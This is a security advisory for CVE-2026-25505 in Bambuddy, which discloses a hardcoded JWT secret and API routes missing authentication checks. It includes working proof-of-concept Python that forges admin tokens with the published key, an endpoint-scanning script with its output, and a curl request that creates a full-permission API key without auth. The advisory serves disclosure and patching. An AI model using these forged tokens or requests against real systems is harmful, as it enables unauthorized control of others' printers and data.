# Bambuddy Uses Hardcoded Secret Key + Many API Endpoints do not Require Authentication

**GHSA**: GHSA-gc24-px2r-5qmf | **CVE**: CVE-2026-25505 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-306, CWE-321

**Affected Packages**:
- **bambuddy** (pip): < 0.1.7

## Description

### Summary
1. A hardcoded secret key used for signing JWTs is checked into source code
2. ManyAPI routes do not check authentication

### Details
I am using the publicly available docker image at `ghcr.io/maziggy/bambuddy`
#### 1. Hardcoded JWT Secret Key
https://github.com/maziggy/bambuddy/blob/a9bb8ed8239602bf08a9914f85a09eeb2bf13d15/backend/app/core/auth.py#L28

<details>
<summary>Copying the Authorization token from a request via browser networking tools into JWT.io confirms the token is signed with this key</summary>

<img width="1591" height="937" alt="image" src="https://github.com/user-attachments/assets/fd6e805a-9380-438f-a412-623660fa3f5a" />

</details>

Any attacker can:
1. Forge valid JWT tokens for any user
2. Bypass authentication entirely
3. Gain full administrative access to any Bambuddy instance using the default key

**Steps to Reproduce:**

1. Run an instance of BamBuddy
2. Create admin user
3. Forge and use JWT:
```python
import jwt
import requests

token = jwt.encode({"sub": "admin", "exp": 9999999999}, "bambuddy-secret-key-change-in-production", algorithm="HS256")
resp = requests.get("http://10.0.0.4:8000/api/v1/system/info", headers={"Authorization": f"Bearer {token}"})

print(resp.status_code) # 200
print(resp.text) # {"app":{"version":"0.1.7b","base_dir":"/app/data","archive_dir":"/app/data/archive"},"database": ...
```

#### 2. Most API Routes do not check Auth
While investigating the JWT forgery, I noticed that requests without `Authorization` headers still returned information for many endpoints:
```python
resp = requests.get("http://10.0.0.4:8000/api/v1/system/info", headers={}) # Empty headers

print(resp.status_code) # 200
print(resp.text) # {"app":{"version":"0.1.7b","base_dir":"/app/data","archive_dir":"/app/data/archive"},"database": ...
```

#### Full Script and Output

Note: I do not have smart plugs or spoolman set up to verify actual behavior with those endpoints so they are excluded from this script.

<details>
<summary>Script to test GET endpoints with forged JWT and without any auth</summary>

```python3
#!/usr/bin/env python3
"""
Proof of Concept: JWT Forgery via Hardcoded Secret Key (VULN-001)
For security research purposes only.

Tests all GET endpoints to identify which are accessible without authentication.
"""

import requests
import jwt

# Hardcoded secret from backend/app/core/auth.py:28
HARDCODED_SECRET = "bambuddy-secret-key-change-in-production"
TARGET = "http://10.0.0.4:8000"
API_PREFIX = "/api/v1"

# All GET endpoints organized by router
ENDPOINTS = {
    "system": [
        "/system/info",
    ],
    "auth": [
        "/auth/status",
        "/auth/me",
    ],
    "users": [
        "/users",
        "/users/1",
        "/users/1/items-count",
    ],
    "groups": [
        "/groups",
        "/groups/permissions",
        "/groups/1",
    ],
    "settings": [
        "/settings",
        "/settings/check-ffmpeg",
        "/settings/spoolman",
        "/settings/backup",
        "/settings/virtual-printer/models",
        "/settings/virtual-printer",
        "/settings/mqtt/status",
    ],
    "printers": [
        "/printers/",
        "/printers/usb-cameras",
        "/printers/1",
        "/printers/1/status",
        "/printers/1/current-print-user",
        "/printers/1/cover",
        "/printers/1/files",
        "/printers/1/storage",
        "/printers/1/logging",
        "/printers/1/slot-presets",
        "/printers/1/slot-presets/1/1",
        "/printers/1/print/objects",
        "/printers/1/runtime-debug",
        "/printers/1/camera/status",
        "/printers/1/camera/test",
        "/printers/1/camera/plate-detection/status",
        "/printers/1/camera/plate-detection/references",
        "/printers/1/kprofiles/",
        "/printers/1/kprofiles/notes",
    ],
    "archives": [
        "/archives/",
        "/archives/search",
        "/archives/compare",
        "/archives/analysis/failures",
        "/archives/stats",
        "/archives/tags",
        "/archives/1",
        "/archives/1/similar",
        "/archives/1/duplicates",
        "/archives/1/capabilities",
        "/archives/1/gcode",
        "/archives/1/plates",
        "/archives/1/filament-requirements",
        "/archives/1/project-page",
        "/archives/1/source",
    ],
    "filaments": [
        "/filaments/",
        "/filaments/1",
        "/filaments/by-type/pla",
    ],
    "cloud": [
        "/cloud/status",
        "/cloud/settings",
        "/cloud/settings/1",
        "/cloud/devices",
        "/cloud/firmware-updates",
        "/cloud/fields",
        "/cloud/fields/print",
    ],
    "queue": [
        "/queue/",
        "/queue/1",
    ],
    "notifications": [
        "/notifications/",
        "/notifications/logs",
        "/notifications/logs/stats",
        "/notifications/1",
    ],
    "notification_templates": [
        "/notification-templates",
        "/notification-templates/variables",
        "/notification-templates/1",
    ],
    "updates": [
        "/updates/version",
        "/updates/check",
        "/updates/status",
    ],
    "maintenance": [
        "/maintenance/types",
        "/maintenance/overview",
        "/maintenance/summary",
        "/maintenance/printers/1",
        "/maintenance/items/1/history",
    ],
    "external_links": [
        "/external-links/",
        "/external-links/1",
    ],
    "projects": [
        "/projects",
        "/projects/templates",
        "/projects/1",
        "/projects/1/archives",
        "/projects/1/queue",
        "/projects/1/bom",
        "/projects/1/timeline",
    ],
    "library": [
        "/library/folders",
        "/library/folders/by-archive/1",
        "/library/folders/by-project/1",
        "/library/files",
        "/library/stats",
        "/library/folders/1",
        "/library/files/1",
        "/library/files/1/plates",
        "/library/files/1/gcode",
        "/library/files/1/filament-requirements",
    ],
    "api_keys": [
        "/api-keys/",
        "/api-keys/1",
    ],
    "webhook": [
        "/webhook/printer/1/status",
        "/webhook/queue",
    ],
    "ams_history": [
        "/ams-history/1/1",
    ],
    "support": [
        "/support/debug-logging",
        "/support/logs",
    ],
    "discovery": [
        "/discovery/info",
        "/discovery/status",
        "/discovery/printers",
        "/discovery/scan/status",
    ],
    "pending_uploads": [
        "/pending-uploads/",
        "/pending-uploads/count",
        "/pending-uploads/1",
    ],
    "firmware": [
        "/firmware/updates",
        "/firmware/updates/1",
        "/firmware/latest",
    ],
    "github_backup": [
        "/github-backup/config",
        "/github-backup/status",
        "/github-backup/logs",
    ],
    "metrics": [
        "/metrics",
    ],
}


def forge_token():
    """Forge a valid JWT token using the hardcoded secret."""
    payload = {"sub": "admin", "exp": 9999999999}
    return jwt.encode(payload, HARDCODED_SECRET, algorithm="HS256")


def test_endpoint(endpoint, headers):
    """Test a single endpoint and return status."""
    try:
        resp = requests.get(f"{TARGET}{API_PREFIX}{endpoint}", headers=headers, timeout=5)
        return resp.status_code, resp.text[:100] if resp.status_code == 200 else None
    except requests.RequestException as e:
        return "ERROR", str(e)[:50]


def main():
    token = forge_token()
    print(f"[*] Forged JWT token:\n    {token}\n")

    # Test with no auth, then with forged JWT
    test_modes = [
        ("NO AUTH", {}),
        ("FORGED JWT", {"Authorization": f"Bearer {token}"}),
    ]

    results = {"no_auth": [], "jwt_only": [], "both_fail": []}

    print(f"[*] Testing {sum(len(v) for v in ENDPOINTS.values())} endpoints against {TARGET}\n")
    print("=" * 70)

    for category, endpoints in ENDPOINTS.items():
        print(f"\n[{category.upper()}]")

        for endpoint in endpoints:
            no_auth_status, _ = test_endpoint(endpoint, {})
            jwt_status, preview = test_endpoint(endpoint, {"Authorization": f"Bearer {token}"})

            if no_auth_status == 200:
                results["no_auth"].append(endpoint)
                print(f"  {endpoint}: NO AUTH REQUIRED")
            elif jwt_status == 200:
                results["jwt_only"].append(endpoint)
                print(f"  {endpoint}: JWT WORKS")
            else:
                results["both_fail"].append((endpoint, no_auth_status, jwt_status))
                print(f"  {endpoint}: {no_auth_status} / {jwt_status}")

    # Summary
    print("\n" + "=" * 70)
    print("\n[SUMMARY]\n")

    print(f"Endpoints accessible WITHOUT authentication ({len(results['no_auth'])}):")
    for ep in results["no_auth"]:
        print(f"  - {ep}")

    print(f"\nEndpoints accessible with FORGED JWT only ({len(results['jwt_only'])}):")
    for ep in results["jwt_only"]:
        print(f"  - {ep}")

    print(f"\nEndpoints that rejected both ({len(results['both_fail'])}):")
    for ep, no_auth, jwt_auth in results["both_fail"]:
        print(f"  - {ep} (no_auth: {no_auth}, jwt: {jwt_auth})")


if __name__ == "__main__":
    main()
```

</details>

<details>
<summary>Script output</summary>

```
[*] Forged JWT token:
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzcGVlbmFoIiwiZXhwIjo5OTk5OTk5OTk5fQ.xeUmpf4PkhI7jHHGBPLWQEQQ4GTiiUOENeQkPpvNMnA

[*] Testing 117 endpoints against http://10.0.0.4:8000

======================================================================

[SYSTEM]
  /system/info: NO AUTH REQUIRED

[AUTH]
  /auth/status: NO AUTH REQUIRED
  /auth/me: JWT WORKS

[USERS]
  /users: JWT WORKS
  /users/1: JWT WORKS
  /users/1/items-count: JWT WORKS

[GROUPS]
  /groups: JWT WORKS
  /groups/permissions: JWT WORKS
  /groups/1: JWT WORKS

[SETTINGS]
  /settings: NO AUTH REQUIRED
  /settings/check-ffmpeg: NO AUTH REQUIRED
  /settings/spoolman: NO AUTH REQUIRED
  /settings/backup: NO AUTH REQUIRED
  /settings/virtual-printer/models: NO AUTH REQUIRED
  /settings/virtual-printer: NO AUTH REQUIRED
  /settings/mqtt/status: NO AUTH REQUIRED

[PRINTERS]
  /printers/: JWT WORKS
  /printers/usb-cameras: JWT WORKS
  /printers/1: JWT WORKS
  /printers/1/status: JWT WORKS
  /printers/1/current-print-user: JWT WORKS
  /printers/1/cover: JWT WORKS
  /printers/1/files: JWT WORKS
  /printers/1/storage: JWT WORKS
  /printers/1/logging: JWT WORKS
  /printers/1/slot-presets: JWT WORKS
  /printers/1/slot-presets/1/1: JWT WORKS
  /printers/1/print/objects: JWT WORKS
  /printers/1/runtime-debug: JWT WORKS
  /printers/1/camera/status: NO AUTH REQUIRED
  /printers/1/camera/test: ERROR / ERROR
  /printers/1/camera/plate-detection/status: NO AUTH REQUIRED
  /printers/1/camera/plate-detection/references: NO AUTH REQUIRED
  /printers/1/kprofiles/: ERROR / ERROR
  /printers/1/kprofiles/notes: NO AUTH REQUIRED

[ARCHIVES]
  /archives/: NO AUTH REQUIRED
  /archives/search: 422 / 422
  /archives/compare: 422 / 422
  /archives/analysis/failures: NO AUTH REQUIRED
  /archives/stats: NO AUTH REQUIRED
  /archives/tags: NO AUTH REQUIRED
  /archives/1: NO AUTH REQUIRED
  /archives/1/similar: NO AUTH REQUIRED
  /archives/1/duplicates: NO AUTH REQUIRED
  /archives/1/capabilities: NO AUTH REQUIRED
  /archives/1/gcode: NO AUTH REQUIRED
  /archives/1/plates: NO AUTH REQUIRED
  /archives/1/filament-requirements: NO AUTH REQUIRED
  /archives/1/project-page: NO AUTH REQUIRED
  /archives/1/source: 404 / 404

[FILAMENTS]
  /filaments/: NO AUTH REQUIRED
  /filaments/1: NO AUTH REQUIRED
  /filaments/by-type/pla: NO AUTH REQUIRED

[CLOUD]
  /cloud/status: NO AUTH REQUIRED
  /cloud/settings: 401 / 401
  /cloud/settings/1: 401 / 401
  /cloud/devices: 401 / 401
  /cloud/firmware-updates: 401 / 401
  /cloud/fields: NO AUTH REQUIRED
  /cloud/fields/print: NO AUTH REQUIRED

[QUEUE]
  /queue/: NO AUTH REQUIRED
  /queue/1: 404 / 404

[NOTIFICATIONS]
  /notifications/: NO AUTH REQUIRED
  /notifications/logs: NO AUTH REQUIRED
  /notifications/logs/stats: NO AUTH REQUIRED
  /notifications/1: 404 / 404

[NOTIFICATION_TEMPLATES]
  /notification-templates: NO AUTH REQUIRED
  /notification-templates/variables: NO AUTH REQUIRED
  /notification-templates/1: NO AUTH REQUIRED

[UPDATES]
  /updates/version: NO AUTH REQUIRED
  /updates/check: NO AUTH REQUIRED
  /updates/status: NO AUTH REQUIRED

[MAINTENANCE]
  /maintenance/types: NO AUTH REQUIRED
  /maintenance/overview: NO AUTH REQUIRED
  /maintenance/summary: NO AUTH REQUIRED
  /maintenance/printers/1: NO AUTH REQUIRED
  /maintenance/items/1/history: NO AUTH REQUIRED

[EXTERNAL_LINKS]
  /external-links/: NO AUTH REQUIRED
  /external-links/1: 404 / 404

[PROJECTS]
  /projects: NO AUTH REQUIRED
  /projects/templates: NO AUTH REQUIRED
  /projects/1: NO AUTH REQUIRED
  /projects/1/archives: NO AUTH REQUIRED
  /projects/1/queue: NO AUTH REQUIRED
  /projects/1/bom: NO AUTH REQUIRED
  /projects/1/timeline: NO AUTH REQUIRED

[LIBRARY]
  /library/folders: NO AUTH REQUIRED
  /library/folders/by-archive/1: NO AUTH REQUIRED
  /library/folders/by-project/1: NO AUTH REQUIRED
  /library/files: NO AUTH REQUIRED
  /library/stats: NO AUTH REQUIRED
  /library/folders/1: NO AUTH REQUIRED
  /library/files/1: 404 / 404
  /library/files/1/plates: 404 / 404
  /library/files/1/gcode: 404 / 404
  /library/files/1/filament-requirements: 404 / 404

[API_KEYS]
  /api-keys/: NO AUTH REQUIRED
  /api-keys/1: NO AUTH REQUIRED

[WEBHOOK]
  /webhook/printer/1/status: 401 / 401
  /webhook/queue: 401 / 401

[AMS_HISTORY]
  /ams-history/1/1: NO AUTH REQUIRED

[SUPPORT]
  /support/debug-logging: NO AUTH REQUIRED
  /support/logs: NO AUTH REQUIRED

[DISCOVERY]
  /discovery/info: NO AUTH REQUIRED
  /discovery/status: NO AUTH REQUIRED
  /discovery/printers: NO AUTH REQUIRED
  /discovery/scan/status: NO AUTH REQUIRED

[PENDING_UPLOADS]
  /pending-uploads/: NO AUTH REQUIRED
  /pending-uploads/count: NO AUTH REQUIRED
  /pending-uploads/1: 404 / 404

[FIRMWARE]
  /firmware/updates: NO AUTH REQUIRED
  /firmware/updates/1: NO AUTH REQUIRED
  /firmware/latest: NO AUTH REQUIRED

[GITHUB_BACKUP]
  /github-backup/config: NO AUTH REQUIRED
  /github-backup/status: NO AUTH REQUIRED
  /github-backup/logs: NO AUTH REQUIRED

[METRICS]
  /metrics: 401 / 401

======================================================================

[SUMMARY]

Endpoints accessible WITHOUT authentication (77):
  - /system/info
  - /auth/status
  - /settings
  - /settings/check-ffmpeg
  - /settings/spoolman
  - /settings/backup
  - /settings/virtual-printer/models
  - /settings/virtual-printer
  - /settings/mqtt/status
  - /printers/1/camera/status
  - /printers/1/camera/plate-detection/status
  - /printers/1/camera/plate-detection/references
  - /printers/1/kprofiles/notes
  - /archives/
  - /archives/analysis/failures
  - /archives/stats
  - /archives/tags
  - /archives/1
  - /archives/1/similar
  - /archives/1/duplicates
  - /archives/1/capabilities
  - /archives/1/gcode
  - /archives/1/plates
  - /archives/1/filament-requirements
  - /archives/1/project-page
  - /filaments/
  - /filaments/1
  - /filaments/by-type/pla
  - /cloud/status
  - /cloud/fields
  - /cloud/fields/print
  - /queue/
  - /notifications/
  - /notifications/logs
  - /notifications/logs/stats
  - /notification-templates
  - /notification-templates/variables
  - /notification-templates/1
  - /updates/version
  - /updates/check
  - /updates/status
  - /maintenance/types
  - /maintenance/overview
  - /maintenance/summary
  - /maintenance/printers/1
  - /maintenance/items/1/history
  - /external-links/
  - /projects
  - /projects/templates
  - /projects/1
  - /projects/1/archives
  - /projects/1/queue
  - /projects/1/bom
  - /projects/1/timeline
  - /library/folders
  - /library/folders/by-archive/1
  - /library/folders/by-project/1
  - /library/files
  - /library/stats
  - /library/folders/1
  - /api-keys/
  - /api-keys/1
  - /ams-history/1/1
  - /support/debug-logging
  - /support/logs
  - /discovery/info
  - /discovery/status
  - /discovery/printers
  - /discovery/scan/status
  - /pending-uploads/
  - /pending-uploads/count
  - /firmware/updates
  - /firmware/updates/1
  - /firmware/latest
  - /github-backup/config
  - /github-backup/status
  - /github-backup/logs

Endpoints accessible with FORGED JWT only (20):
  - /auth/me
  - /users
  - /users/1
  - /users/1/items-count
  - /groups
  - /groups/permissions
  - /groups/1
  - /printers/
  - /printers/usb-cameras
  - /printers/1
  - /printers/1/status
  - /printers/1/current-print-user
  - /printers/1/cover
  - /printers/1/files
  - /printers/1/storage
  - /printers/1/logging
  - /printers/1/slot-presets
  - /printers/1/slot-presets/1/1
  - /printers/1/print/objects
  - /printers/1/runtime-debug

Endpoints that rejected both (20):
  - /printers/1/camera/test (no_auth: ERROR, jwt: ERROR)
  - /printers/1/kprofiles/ (no_auth: ERROR, jwt: ERROR)
  - /archives/search (no_auth: 422, jwt: 422)
  - /archives/compare (no_auth: 422, jwt: 422)
  - /archives/1/source (no_auth: 404, jwt: 404)
  - /cloud/settings (no_auth: 401, jwt: 401)
  - /cloud/settings/1 (no_auth: 401, jwt: 401)
  - /cloud/devices (no_auth: 401, jwt: 401)
  - /cloud/firmware-updates (no_auth: 401, jwt: 401)
  - /queue/1 (no_auth: 404, jwt: 404)
  - /notifications/1 (no_auth: 404, jwt: 404)
  - /external-links/1 (no_auth: 404, jwt: 404)
  - /library/files/1 (no_auth: 404, jwt: 404)
  - /library/files/1/plates (no_auth: 404, jwt: 404)
  - /library/files/1/gcode (no_auth: 404, jwt: 404)
  - /library/files/1/filament-requirements (no_auth: 404, jwt: 404)
  - /webhook/printer/1/status (no_auth: 401, jwt: 401)
  - /webhook/queue (no_auth: 401, jwt: 401)
  - /pending-uploads/1 (no_auth: 404, jwt: 404)
  - /metrics (no_auth: 401, jwt: 401)
```

</details>

While this script only tests the GET endpoints, these vulnerabilities are not exclusive to GET endpoints. The GET endpoints were easiest to script since they generally don't require many parameters, but other methods still appear vulnerable. I manually tested `POST /api/v1/api-keys/` and was able to create a new API key with all permissions without auth:
```bash
curl 'http://10.0.0.4:8000/api/v1/api-keys/' -X POST -H 'Content-Type: application/json' --data-raw '{"name":"new key","can_queue":true,"can_control_printer":true,"can_read_status":true}'
```
yields
```json
{"id":7,"name":"new key","key_prefix":"bb_QW2su...","can_queue":true,"can_control_printer":true,"can_read_status":true,"printer_ids":null,"enabled":true,"last_used":null,"created_at":"2026-02-01T23:14:15","expires_at":null,"key":"bb_QW2suZVIHiUbadSyyAMrnmf0zFhDG5e9BSVBvb4ZN-w"}
```

### Impact
BamBuddy is vulnerable to unauthorized access and control
